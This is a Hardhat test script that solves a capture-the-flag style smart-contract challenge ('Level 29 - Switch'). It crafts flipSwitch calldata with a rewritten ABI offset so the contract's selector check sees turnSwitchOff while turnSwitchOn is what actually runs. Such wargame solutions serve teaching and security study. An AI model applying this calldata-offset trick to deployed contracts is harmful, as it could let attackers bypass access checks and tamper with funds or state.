import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 29 - Switch contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const SwitchContract = await ethers.getContractFactory("Switch");
        const switchCon = await SwitchContract.deploy();

        return {owner, hacker, switchCon};
    };
    
    describe("When hacking", () => {
        it("Hacker should switch on by manipulating the flipSwitch method calldata", async() => {
            const {owner, hacker, switchCon} = await loadFixture(setUp);

            expect(await switchCon.switchOn()).to.equal(false);

            const iface = new ethers.Interface([
                "function turnSwitchOn()",
                "function turnSwitchOff()",
                "function flipSwitch(bytes)"
            ]);

            const turnSwitchOffSignature = iface.encodeFunctionData("turnSwitchOff");
            const turnSwitchOnSignature = iface.encodeFunctionData("turnSwitchOn");

            const flipSwitchSignature = iface.encodeFunctionData("flipSwitch", [turnSwitchOffSignature]);
            const auxEncodedSwitchOn = iface.encodeFunctionData("flipSwitch", [turnSwitchOnSignature]);

            let calldata = flipSwitchSignature + auxEncodedSwitchOn.slice(74);

            // We modify the calldata offset so that it points to the turnSwitchOn selector.
            calldata = calldata.slice(0, 72) + "60" + calldata.slice(74);

            await hacker.sendTransaction({to: await switchCon.getAddress(), data: calldata});
            expect(await switchCon.switchOn()).to.equal(true);         
        });
    });
});